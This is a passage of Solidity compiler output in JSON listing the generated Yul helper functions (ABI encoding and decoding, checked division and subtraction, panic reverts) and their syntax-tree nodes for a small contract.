									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_decode_t_bool": {
									"entryPoint": 294,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 315,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 360,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 375,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 390,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 417,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 444,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 493,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 545,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 557,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 567,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 640,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 687,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 734,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 739,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2782:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "56:84:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "66:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "88:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "75:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "75:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "66:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "128:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "104:23:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "104:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "104:30:1"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "34:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "42:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "50:5:1",
														"type": ""
													}
												],
												"src": "7:133:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "209:260:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "255:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "257:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "257:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "257:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "230:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "239:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "226:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "226:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "251:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "222:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "222:32:1"
															},
															"nodeType": "YulIf",
															"src": "219:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "348:114:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "363:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "377:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "367:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "392:60:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "424:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "435:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "420:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "420:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "444:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "402:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "402:50:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "392:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "179:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "190:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "202:6:1",
														"type": ""
													}
												],
												"src": "146:323:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "534:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "551:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "571:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "556:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "556:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "544:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "544:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "544:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "522:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "529:3:1",
														"type": ""
													}
												],
												"src": "475:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "655:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "672:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "695:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "677:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "677:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "665:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "665:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "665:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "643:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "650:3:1",
														"type": ""
													}
												],
												"src": "590:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "806:118:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "816:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "828:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "839:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "824:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "824:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "816:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "890:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "903:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "914:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "899:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "899:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "852:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "852:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "852:65:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "778:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "790:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "801:4:1",
														"type": ""
													}
												],
												"src": "714:210:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1028:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1038:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1050:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1061:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1046:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1046:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1038:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1118:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1131:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1142:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1127:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1127:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1074:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1074:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1074:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1000:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1012:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1023:4:1",
														"type": ""
													}
												],
												"src": "930:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1198:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1208:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1224:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1218:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1218:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "1208:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "1191:6:1",
														"type": ""
													}
												],
												"src": "1158:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1281:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1291:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1314:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1296:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1296:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1291:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1325:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1348:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1330:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1330:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1325:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1372:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1374:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1374:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1374:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1369:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1362:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1362:9:1"
															},
															"nodeType": "YulIf",
															"src": "1359:35:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1404:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1413:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1416:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1409:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1409:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1404:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1270:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1273:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1279:1:1",
														"type": ""
													}
												],
												"src": "1239:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1475:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1485:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1508:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1490:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1490:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1485:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1519:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1542:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1524:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1524:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1519:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1566:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1568:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1568:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1568:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1560:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1563:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1557:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1557:8:1"
															},
															"nodeType": "YulIf",
															"src": "1554:34:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1598:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1610:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1613:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1606:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1606:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1598:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1461:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1464:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1470:4:1",
														"type": ""
													}
												],
												"src": "1430:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1669:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1679:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1704:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1697:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1697:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1690:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1690:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1679:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1651:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1661:7:1",
														"type": ""
													}
												],
												"src": "1627:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1768:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1778:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1789:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1778:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1750:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1760:7:1",
														"type": ""
													}
												],
												"src": "1723:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1849:190:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1859:33:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1886:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1868:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1868:24:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1859:5:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1982:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1984:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1984:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1984:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1907:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1914:66:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1904:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1904:77:1"
															},
															"nodeType": "YulIf",
															"src": "1901:103:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2013:20:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2024:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2031:1:1",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2020:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2020:13:1"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "2013:3:1"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1835:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "1845:3:1",
														"type": ""
													}
												],
												"src": "1806:233:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2073:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2093:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2083:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2083:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2083:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2187:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2190:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2180:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2180:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2180:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2211:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2214:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2204:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2204:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2204:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2045:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2259:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2276:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2279:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2269:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2269:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2269:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2373:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2376:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2366:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2366:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2366:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2397:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2400:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2390:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2390:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2390:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2231:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2506:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2523:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2526:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2516:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2516:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2516:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "2417:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2629:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2646:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
